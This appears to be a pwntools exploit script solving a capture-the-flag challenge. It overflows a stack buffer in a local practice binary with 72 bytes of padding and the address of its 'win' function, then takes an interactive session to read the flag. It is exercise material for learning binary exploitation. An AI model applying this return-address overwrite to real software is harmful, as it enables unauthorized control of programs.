from pwn import *

# Set up the binary
binary = ELF('./buffer_buffet_test')

# Find the address of the win function
win_address = binary.symbols['win']
log.info(f"Address of win function: {hex(win_address)}")

# Start the binary process
p = process('./buffer_buffet_test')

# Find the offset
offset = 72
log.info(f"Offset found at: {offset}")

# Create the final payload
final_payload = b'A' * offset
final_payload += p64(win_address)

# Restart the process and send the final payload
p.sendline(final_payload)

# Interact with the shell to get the flag
p.interactive()
